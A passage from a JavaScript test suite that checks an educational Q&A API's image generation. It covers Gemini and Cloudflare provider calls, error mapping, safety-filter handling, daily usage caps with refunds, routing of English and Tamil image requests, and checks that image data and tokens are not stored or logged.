          process.env.GEMINI_IMAGE_MODEL = origModel;
        }
      }
    });

    it('9.2 GET /api/ask/capabilities requires auth and returns correct imageGeneration boolean and provider', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      const origProvider = process.env.IMAGE_PROVIDER;
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;

      try {
        // Without auth -> 401
        const unauthRes = await request(server).get('/api/ask/capabilities');
        assert.equal(unauthRes.status, 401);

        // With GEMINI_IMAGE_MODEL set -> true, provider: 'gemini'
        delete process.env.IMAGE_PROVIDER;
        delete process.env.CF_ACCOUNT_ID;
        delete process.env.CF_API_TOKEN;
        process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';
        const resTrue = await request(server)
          .get('/api/ask/capabilities')
          .set('Authorization', authGenImgUser);
        assert.equal(resTrue.status, 200);
        assert.equal(resTrue.body.imageGeneration, true);
        assert.equal(resTrue.body.provider, 'gemini');

        // With IMAGE_PROVIDER = 'cloudflare' and CF credentials set
        process.env.IMAGE_PROVIDER = 'cloudflare';
        process.env.CF_ACCOUNT_ID = 'test-cf-account';
        process.env.CF_API_TOKEN = 'test-cf-token';
        const resCf = await request(server)
          .get('/api/ask/capabilities')
          .set('Authorization', authGenImgUser);
        assert.equal(resCf.status, 200);
        assert.equal(resCf.body.imageGeneration, true);
        assert.equal(resCf.body.provider, 'cloudflare');

        // With IMAGE_PROVIDER = 'none'
        process.env.IMAGE_PROVIDER = 'none';
        const resNone = await request(server)
          .get('/api/ask/capabilities')
          .set('Authorization', authGenImgUser);
        assert.equal(resNone.status, 200);
        assert.equal(resNone.body.imageGeneration, false);
        assert.equal(resNone.body.provider, 'none');

        // With GEMINI_IMAGE_MODEL unset and no credentials -> false, provider: 'none'
        delete process.env.IMAGE_PROVIDER;
        delete process.env.GEMINI_IMAGE_MODEL;
        delete process.env.CF_ACCOUNT_ID;
        delete process.env.CF_API_TOKEN;
        const resFalse = await request(server)
          .get('/api/ask/capabilities')
          .set('Authorization', authGenImgUser);
        assert.equal(resFalse.status, 200);
        assert.equal(resFalse.body.imageGeneration, false);
        assert.equal(resFalse.body.provider, 'none');
      } finally {
        if (origModel) {
          process.env.GEMINI_IMAGE_MODEL = origModel;
        } else {
          delete process.env.GEMINI_IMAGE_MODEL;
        }
        if (origProvider) {
          process.env.IMAGE_PROVIDER = origProvider;
        } else {
          delete process.env.IMAGE_PROVIDER;
        }
        if (origAccount) {
          process.env.CF_ACCOUNT_ID = origAccount;
        } else {
          delete process.env.CF_ACCOUNT_ID;
        }
        if (origToken) {
          process.env.CF_API_TOKEN = origToken;
        } else {
          delete process.env.CF_API_TOKEN;
        }
      }
    });

    it('9.3 success: stubs fetch, validates call format, returns inlineData and caption', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';
      const fakeBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';

      let capturedUrl = '';
      let capturedOptions = null;

      const mockFetch = mock.method(global, 'fetch', async (url, options) => {
        if (!capturedUrl || (url && url.includes('gemini-3.1-flash-lite-image'))) {
          capturedUrl = url;
          capturedOptions = options;
        }
        return {
          ok: true,
          status: 200,
          json: async () => ({
            candidates: [
              {
                content: {
                  parts: [
                    { text: 'A clean scientific diagram of a plant cell.' },
                    {
                      inlineData: {
                        mimeType: 'image/png',
                        data: fakeBase64,
                      },
                    },
                  ],
                },
              },
            ],
          }),
        };
      });

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'A simple labelled diagram of a plant cell',
            mode: 'image',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.mode, 'image');
        assert.equal(res.body.resolvedMode, 'image');
        assert.ok(res.body.image);
        assert.equal(res.body.image.mimeType, 'image/png');
        assert.equal(res.body.image.data, fakeBase64);
        assert.equal(res.body.caption, 'A clean scientific diagram of a plant cell.');
        assert.ok(res.body.conversationId);

        // Verify call format
        assert.match(capturedUrl, /models\/gemini-3\.1-flash-lite-image:generateContent/);
        assert.equal(capturedOptions.method, 'POST');
        assert.equal(capturedOptions.headers['Content-Type'], 'application/json');
        assert.ok(capturedOptions.headers['x-goog-api-key']);
        const sentBody = JSON.parse(capturedOptions.body);
        assert.deepEqual(sentBody.generationConfig.responseModalities, ['TEXT', 'IMAGE']);
        assert.match(sentBody.contents[0].parts[0].text, /educational illustration/i);
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.4 429 quota error: maps to status 429 with clear message and no raw text', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';

      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: false,
        status: 429,
        json: async () => ({
          error: { message: 'ResourceExhausted: Quota exceeded for quota group ...' },
        }),
      }));

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Illustrate mitochondria',
            mode: 'image',
          });

        assert.equal(res.status, 429);
        assert.equal(res.body.error, true);
        assert.match(res.body.message, /quota exceeded/i);
        assert.ok(!res.body.message.includes('ResourceExhausted'), 'Must not leak raw Google error text');
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.5 403 permission/billing error: maps to status 503 with clear message', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';

      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: false,
        status: 403,
        json: async () => ({
          error: { message: 'The caller does not have permission / billing required' },
        }),
      }));

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Draw an anatomy diagram',
            mode: 'image',
          });

        assert.equal(res.status, 503);
        assert.equal(res.body.error, true);
        assert.match(res.body.message, /not available.*or requires billing/i);
        assert.ok(!res.body.message.includes('The caller does not have permission'));
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.6 404 model not found: maps to status 503 with clear message', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-nonexistent-image';

      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: false,
        status: 404,
        json: async () => ({
          error: { message: 'models/gemini-nonexistent-image is not found' },
        }),
      }));

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Illustrate DNA structure',
            mode: 'image',
          });

        assert.equal(res.status, 503);
        assert.equal(res.body.error, true);
        assert.match(res.body.message, /model is not available/i);
        assert.ok(!res.body.message.includes('gemini-nonexistent-image'));
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.7 response without an image part: returns 502', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';

      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          candidates: [
            {
              content: {
                parts: [{ text: 'Here is some text without an image.' }],
              },
            },
          ],
        }),
      }));

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Illustrate photosynthesis',
            mode: 'image',
          });

        assert.equal(res.status, 502);
        assert.equal(res.body.error, true);
        assert.match(res.body.message, /did not return an image/i);
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.8 safety block: candidate.finishReason SAFETY or promptFeedback blockReason returns 400', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';

      // 1. Candidate finishReason SAFETY
      let mockFetch = mock.method(global, 'fetch', async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          candidates: [
            {
              finishReason: 'SAFETY',
              content: { parts: [] },
            },
          ],
        }),
      }));

      try {
        const res1 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Unsafe image topic',
            mode: 'image',
          });

        assert.equal(res1.status, 400);
        assert.equal(res1.body.error, true);
        assert.match(res1.body.message, /safety filter/i);

        mockFetch.mock.restore();

        // 2. promptFeedback blockReason SAFETY
        mockFetch = mock.method(global, 'fetch', async () => ({
          ok: true,
          status: 200,
          json: async () => ({
            promptFeedback: { blockReason: 'SAFETY' },
          }),
        }));

        const res2 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Harmful image topic',
            mode: 'image',
          });

        assert.equal(res2.status, 400);
        assert.equal(res2.body.error, true);
        assert.match(res2.body.message, /safety filter/i);
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.9 timeout (AbortError): returns 503 timeout message', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';

      const mockFetch = mock.method(global, 'fetch', async () => {
        const abortErr = new Error('The operation was aborted');
        abortErr.name = 'AbortError';
        throw abortErr;
      });

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Long running image generation',
            mode: 'image',
          });

        assert.equal(res.status, 503);
        assert.equal(res.body.error, true);
        assert.match(res.body.message, /timed out after 60 seconds/i);
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.10 daily cap of 5 generated images returns 429 and gives slot back on failure', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';
      const today = getKolkataDateString();

      let shouldFail = true;
      const mockFetch = mock.method(global, 'fetch', async () => {
        if (shouldFail) {
          throw new Error('Connection refused');
        }
        return {
          ok: true,
          status: 200,
          json: async () => ({
            candidates: [
              {
                content: {
                  parts: [
                    { text: 'Chloroplast structure' },
                    { inlineData: { mimeType: 'image/png', data: 'fakeBytes' } },
                  ],
                },
              },
            ],
          }),
        };
      });

      try {
        // Initial usage is 0
        const usageBefore = await AskUsage.findOne({ user: genImgUser._id, date: today });
        assert.equal(usageBefore?.imageCount || 0, 0);

        // Request fails -> slot must be refunded
        const failRes = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Illustrate photosynthesis process',
            mode: 'image',
          });

        assert.equal(failRes.status, 503);
        const usageAfterFail = await AskUsage.findOne({ user: genImgUser._id, date: today });
        assert.equal(usageAfterFail?.imageCount || 0, 0, 'Slot must be refunded after failure');

        // Set imageCount to 5 (cap reached)
        await AskUsage.updateOne(
          { user: genImgUser._id, date: today },
          { imageCount: 5 },
          { upsert: true }
        );

        const capRes = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Illustrate mitochondria',
            mode: 'image',
          });

        assert.equal(capRes.status, 429);
        assert.match(capRes.body.message, /daily image generation limit reached/i);
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.11 image base64 data is NEVER stored in MongoDB conversation or returned in conversation history', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';
      const fakeBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';

      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          candidates: [
            {
              content: {
                parts: [
                  { text: 'A cross-section illustration of the human heart' },
                  { inlineData: { mimeType: 'image/png', data: fakeBase64 } },
                ],
              },
            },
          ],
        }),
      }));

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Illustrate the chambers of the human heart',
            mode: 'image',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.image.data, fakeBase64);
        assert.ok(res.body.conversationId);

        // Verify MongoDB record
        const conv = await Conversation.findById(res.body.conversationId);
        assert.ok(conv);
        assert.equal(conv.messages.length, 2);
        assert.equal(conv.messages[0].role, 'user');
        assert.equal(conv.messages[0].mode, 'image');
        assert.equal(conv.messages[1].role, 'assistant');
        assert.equal(conv.messages[1].mode, 'image');
        assert.equal(conv.messages[1].generatedImage, true);
        assert.ok(!conv.messages[1].content.includes(fakeBase64), 'Base64 must not be in content');
        assert.equal(conv.messages[1].svg, null);

        // Verify GET /api/ask/conversations/:id does NOT contain base64
        const getRes = await request(server)
          .get(`/api/ask/conversations/${conv._id}`)
          .set('Authorization', authGenImgUser);
        assert.equal(getRes.status, 200);
        const returnedJson = JSON.stringify(getRes.body);
        assert.ok(!returnedJson.includes(fakeBase64), 'Conversation history response must never return base64');
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.12 auto mode routing: matches image request and routes to image mode', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';

      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          candidates: [
            {
              content: {
                parts: [
                  { text: 'Illustration of nature' },
                  { inlineData: { mimeType: 'image/png', data: 'data123' } },
                ],
              },
            },
          ],
        }),
      }));

      try {
        // Match 1: "generate the image of nature"
        const res1 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'generate the image of nature',
            mode: 'auto',
          });

        assert.equal(res1.status, 200);
        assert.equal(res1.body.resolvedMode, 'image');
        assert.ok(res1.body.image);

        // Match 2: "draw a picture of a cell"
        const res2 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'draw a picture of a cell',
            mode: 'auto',
          });

        assert.equal(res2.status, 200);
        assert.equal(res2.body.resolvedMode, 'image');
        assert.ok(res2.body.image);
      } finally {
        mockFetch.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.13 auto mode routing: image request when GEMINI_IMAGE_MODEL is missing returns normal 200 fallback without counting against cap', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      delete process.env.GEMINI_IMAGE_MODEL;
      const today = getKolkataDateString();

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'generate the image of nature',
            mode: 'auto',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.resolvedMode, 'image');
        assert.equal(
          res.body.answer,
          "Image generation isn't enabled on this site yet. Choose Diagram (SVG) for a downloadable diagram."
        );

        // Verify NOT counted against image cap
        const usage = await AskUsage.findOne({ user: genImgUser._id, date: today });
        assert.equal(usage?.imageCount || 0, 0);
        assert.equal(usage?.count || 0, 0);
      } finally {
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
      }
    });

    it('9.14 auto mode routing: matches SVG request and routes to svg mode', async () => {
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => `=== DESCRIPTION ===
Flowchart of algorithms
=== SVG ===
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40"/></svg>`
      );

      try {
        // Match 1: "draw a flowchart of sorting"
        const res1 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'draw a flowchart of sorting',
            mode: 'auto',
          });

        assert.equal(res1.status, 200);
        assert.equal(res1.body.resolvedMode, 'svg');
        assert.ok(res1.body.svg);

        // Match 2: "generate svg of solar system"
        const res2 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'generate svg of solar system',
            mode: 'auto',
          });

        assert.equal(res2.status, 200);
        assert.equal(res2.body.resolvedMode, 'svg');
        assert.ok(res2.body.svg);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('9.15 auto mode routing: non-matches (what is a diagram, describe this picture, uploaded image) do NOT route to image or svg', async () => {
      // Direct unit tests for helper functions
      assert.equal(isImageGenerationRequest('generate the image of nature'), true);
      assert.equal(isImageGenerationRequest('draw a picture of a cell'), true);
      assert.equal(isImageGenerationRequest('what is a diagram'), false);
      assert.equal(isImageGenerationRequest('describe this picture'), false);

      assert.equal(isSvgDiagramRequest('what is a diagram'), false);
      assert.equal(isSvgDiagramRequest('generate svg of solar system'), true);
      assert.equal(isSvgDiagramRequest('draw a diagram of the heart'), true);

      // Integration test with server: "what is a diagram" calls normal text model
      let textPromptCalled = false;
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => {
          textPromptCalled = true;
          return '[MODE: doubt]\nA diagram is a symbolic representation of information.';
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'what is a diagram',
            mode: 'auto',
          });

        assert.equal(res.status, 200);
        assert.equal(textPromptCalled, true, 'Must call normal text model fallback');
        assert.equal(res.body.resolvedMode, 'doubt');
        assert.equal(res.body.image, undefined);
        assert.equal(res.body.svg, undefined);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('9.16 isImageGenerationRequest requires explicit start imperative and rejects non-image queries', async () => {
      // Negative tests: questions containing "make" or "create" without imperative image intent
      assert.equal(isImageGenerationRequest('How do I make a good poster presentation?'), false);
      assert.equal(isImageGenerationRequest('Explain how to create a picture book report'), false);
      assert.equal(isImageGenerationRequest('What is a photo?'), false);
      assert.equal(isImageGenerationRequest('Can we create slides for a lecture?'), false);

      // Positive tests: English explicit imperatives at start
      assert.equal(isImageGenerationRequest('draw an image of the water cycle'), true);
      assert.equal(isImageGenerationRequest('generate a picture of a chloroplast'), true);
      assert.equal(isImageGenerationRequest('create an illustration of photosynthesis'), true);
      assert.equal(isImageGenerationRequest('make a photo of Mount Everest'), true);
      assert.equal(isImageGenerationRequest('produce a drawing of animal cell'), true);
      assert.equal(isImageGenerationRequest('please draw a picture of mitochondria'), true);

      // Positive tests: Tamil explicit imperatives
      assert.equal(isImageGenerationRequest('ஒரு படம் வரைக மனித இதயம்'), true);
      assert.equal(isImageGenerationRequest('படத்தை உருவாக்கு தாவர செல்'), true);
      assert.equal(isImageGenerationRequest('புகைப்படம் ஒன்றை வரைக'), true);

      // Integration test with server: Ensure non-image requests in auto mode route to text model, NOT image
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => '[MODE: doubt]\nA good poster presentation requires clear visual hierarchy and concise summaries.'
      );

      try {
        const res1 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'How do I make a good poster presentation?',
            mode: 'auto',
          });
        assert.equal(res1.status, 200);
        assert.notEqual(res1.body.resolvedMode, 'image');
        assert.equal(res1.body.resolvedMode, 'doubt');
        assert.equal(res1.body.image, undefined);

        const res2 = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Explain how to create a picture book report',
            mode: 'auto',
          });
        assert.equal(res2.status, 200);
        assert.notEqual(res2.body.resolvedMode, 'image');
        assert.equal(res2.body.resolvedMode, 'doubt');
        assert.equal(res2.body.image, undefined);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('9.17 Cloudflare image generation REST client: success, 401, 403, 404, 400, timeout, empty result.image', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      process.env.CF_ACCOUNT_ID = 'cf-test-account-id';
      process.env.CF_API_TOKEN = 'cf-test-token-xyz';

      // 1. Success case: returns image/png or image/jpeg decoded from base64 with magic bytes detection
      const fakePngBytes = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x01, 0x02, 0x03]);
      const fakePngBase64 = fakePngBytes.toString('base64');
      let capturedUrl = '';
      let capturedOptions = null;

      let mockFetch = mock.method(global, 'fetch', async (url, options) => {
        capturedUrl = url;
        capturedOptions = options;
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            result: { image: fakePngBase64 },
          }),
        };
      });

      try {
        const result = await generateCloudflareImage('Draw a picture of an atom');
        assert.equal(result.image.mimeType, 'image/png');
        assert.equal(result.image.data, fakePngBase64);
        assert.ok(result.caption);
        assert.match(capturedUrl, /accounts\/cf-test-account-id\/ai\/run\/@cf\/black-forest-labs\/flux-1-schnell/);
        assert.equal(capturedOptions.method, 'POST');
        assert.equal(capturedOptions.headers['Content-Type'], 'application/json');
        assert.equal(capturedOptions.headers['Authorization'], 'Bearer cf-test-token-xyz');
        const parsedBody = JSON.parse(capturedOptions.body);
        assert.equal(parsedBody.steps, 4);
        assert.match(parsedBody.prompt, /Draw a picture of an atom/);
      } finally {
        mockFetch.mock.restore();
      }

      // 1b. Success case with JPEG magic bytes (FF D8 FF)
      const fakeJpegBytes = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
      const fakeJpegBase64 = fakeJpegBytes.toString('base64');
      mockFetch = mock.method(global, 'fetch', async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          success: true,
          result: { image: fakeJpegBase64 },
        }),
      }));

      try {
        const resultJpeg = await generateCloudflareImage('Draw a picture of a cell');
        assert.equal(resultJpeg.image.mimeType, 'image/jpeg');
        assert.equal(resultJpeg.image.data, fakeJpegBase64);
      } finally {
        mockFetch.mock.restore();
      }

      // Spy on console.error for error cases
      let loggedCalls = [];
      const mockConsoleError = mock.method(console, 'error', (...args) => {
        loggedCalls.push(args);
      });

      try {
        // 2. 401 Unauthorized
        loggedCalls = [];
        mockFetch = mock.method(global, 'fetch', async () => ({
          ok: false,
          status: 401,
          json: async () => ({
            errors: [{ code: 10000, message: 'Authentication error: Invalid API token' }],
          }),
        }));

        await assert.rejects(
          async () => generateCloudflareImage('Cell biology diagram'),
          (err) => {
            assert.equal(err.status, 503);
            assert.match(err.message, /unavailable.*or requires billing/i);
            return true;
          }
        );
        mockFetch.mock.restore();

        assert.equal(loggedCalls.length, 1);
        assert.equal(loggedCalls[0][0], '[ImageGen] cloudflare failed');
        assert.equal(loggedCalls[0][1], 401);
        assert.deepEqual(loggedCalls[0][2], [{ code: 10000, message: 'Authentication error: Invalid API token' }]);
        assert.ok(!JSON.stringify(loggedCalls[0]).includes('cf-test-token-xyz'), 'Never log token');

        // 3. 403 Forbidden
        loggedCalls = [];
        mockFetch = mock.method(global, 'fetch', async () => ({
          ok: false,
          status: 403,
          json: async () => ({
            errors: [{ code: 10001, message: 'Forbidden: Worker does not have AI permissions' }],
          }),
        }));

        await assert.rejects(
          async () => generateCloudflareImage('Mitochondria structure'),
          (err) => {
            assert.equal(err.status, 503);
            assert.match(err.message, /unavailable.*or requires billing/i);
            return true;
          }
        );
        mockFetch.mock.restore();

        assert.equal(loggedCalls.length, 1);
        assert.equal(loggedCalls[0][0], '[ImageGen] cloudflare failed');
        assert.equal(loggedCalls[0][1], 403);
        assert.deepEqual(loggedCalls[0][2], [{ code: 10001, message: 'Forbidden: Worker does not have AI permissions' }]);

        // 4. 404 Not Found (e.g. invalid model or account)
        loggedCalls = [];
        mockFetch = mock.method(global, 'fetch', async () => ({
          ok: false,
          status: 404,
          json: async () => ({
            errors: [{ code: 7000, message: 'No route for that model' }],
          }),
        }));

        await assert.rejects(
          async () => generateCloudflareImage('Photosynthesis stages'),
          (err) => {
            assert.equal(err.status, 503);
            assert.match(err.message, /model is not available/i);
            return true;
          }
        );
        mockFetch.mock.restore();

        assert.equal(loggedCalls.length, 1);
        assert.equal(loggedCalls[0][0], '[ImageGen] cloudflare failed');
        assert.equal(loggedCalls[0][1], 404);
        assert.deepEqual(loggedCalls[0][2], [{ code: 7000, message: 'No route for that model' }]);

        // 5. 400 Bad Request: (a) safety filter block, (b) invalid request
        loggedCalls = [];
        mockFetch = mock.method(global, 'fetch', async () => ({
          ok: false,
          status: 400,
          json: async () => ({
            errors: [{ code: 10002, message: 'Prompt was flagged by safety filter' }],
          }),
        }));

        await assert.rejects(
          async () => generateCloudflareImage('Unsafe topic prompt'),
          (err) => {
            assert.equal(err.status, 400);
            assert.match(err.message, /safety filter/i);
            return true;
          }
        );
        mockFetch.mock.restore();

        assert.equal(loggedCalls.length, 1);
        assert.equal(loggedCalls[0][0], '[ImageGen] cloudflare failed');
        assert.equal(loggedCalls[0][1], 400);

        loggedCalls = [];
        mockFetch = mock.method(global, 'fetch', async () => ({
          ok: false,
          status: 400,
          json: async () => ({
            errors: [{ code: 10003, message: 'Invalid parameter: prompt too long' }],
          }),
        }));

        await assert.rejects(
          async () => generateCloudflareImage('Invalid prompt parameter'),
          (err) => {
            assert.equal(err.status, 400);
            assert.match(err.message, /invalid/i);
            return true;
          }
        );
        mockFetch.mock.restore();

        assert.equal(loggedCalls.length, 1);
        assert.equal(loggedCalls[0][0], '[ImageGen] cloudflare failed');
        assert.equal(loggedCalls[0][1], 400);

        // 6. Timeout (AbortError)
        loggedCalls = [];
        mockFetch = mock.method(global, 'fetch', async () => {
          const timeoutErr = new Error('The operation was aborted');
          timeoutErr.name = 'AbortError';
          throw timeoutErr;
        });

        await assert.rejects(
          async () => generateCloudflareImage('Long running image prompt'),
          (err) => {
            assert.equal(err.status, 503);
            assert.match(err.message, /timed out after 60 seconds/i);
            return true;
          }
        );
        mockFetch.mock.restore();

        assert.equal(loggedCalls.length, 1);
        assert.equal(loggedCalls[0][0], '[ImageGen] cloudflare failed');

        // 7. Empty result.image
        loggedCalls = [];
        mockFetch = mock.method(global, 'fetch', async () => ({
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            result: { image: '' },
          }),
        }));

        await assert.rejects(
          async () => generateCloudflareImage('Prompt with empty image response'),
          (err) => {
            assert.equal(err.status, 502);
            assert.match(err.message, /did not return an image/i);
            return true;
          }
        );
        mockFetch.mock.restore();

        assert.equal(loggedCalls.length, 1);
        assert.equal(loggedCalls[0][0], '[ImageGen] cloudflare failed');

        // 8. Missing credentials
        delete process.env.CF_ACCOUNT_ID;
        await assert.rejects(
          async () => generateCloudflareImage('Draw a cell'),
          (err) => {
            assert.equal(err.status, 503);
            assert.match(err.message, /not configured/i);
            return true;
          }
        );
      } finally {
        mockConsoleError.mock.restore();
        if (origAccount) {
          process.env.CF_ACCOUNT_ID = origAccount;
        } else {
          delete process.env.CF_ACCOUNT_ID;
        }
        if (origToken) {
          process.env.CF_API_TOKEN = origToken;
        } else {
          delete process.env.CF_API_TOKEN;
        }
      }
    });

    it('9.18 fallback to SVG diagram and refund slot on image provider failure', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      const origProvider = process.env.IMAGE_PROVIDER;
      process.env.IMAGE_PROVIDER = 'gemini';
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';
      const today = getKolkataDateString();

      // Mock image provider failure
      const mockFetch = mock.method(global, 'fetch', async () => {
        throw new Error('Image generation upstream network failure');
      });

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => `=== DESCRIPTION ===
Fallback Diagram of Water Molecule
=== SVG ===
<svg viewBox="0 0 300 150" xmlns="http://www.w3.org/2000/svg"><circle cx="150" cy="75" r="40" fill="#3b82f6"/></svg>`
      );

      try {
        const usageBefore = await AskUsage.findOne({ user: genImgUser._id, date: today });
        const imgCountBefore = usageBefore?.imageCount || 0;

        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'draw an image of water molecule',
            mode: 'auto',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.resolvedMode, 'svg');
        assert.ok(res.body.svg);
        assert.match(res.body.description, /Fallback Diagram/i);

        // Ensure imageCount slot was refunded
        const usageAfter = await AskUsage.findOne({ user: genImgUser._id, date: today });
        assert.equal(usageAfter?.imageCount || 0, imgCountBefore, 'imageCount must be refunded after fallback');
      } finally {
        mockFetch.mock.restore();
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
        if (origProvider) process.env.IMAGE_PROVIDER = origProvider;
      }
    });

    it('9.19 global daily cap IMAGE_DAILY_GLOBAL_CAP enforced in GlobalImageUsage and falls back or limits', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      const origProvider = process.env.IMAGE_PROVIDER;
      const origCap = process.env.IMAGE_DAILY_GLOBAL_CAP;
      process.env.IMAGE_PROVIDER = 'gemini';
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';
      process.env.IMAGE_DAILY_GLOBAL_CAP = '10';
      const today = getKolkataDateString();

      // Seed GlobalImageUsage to cap
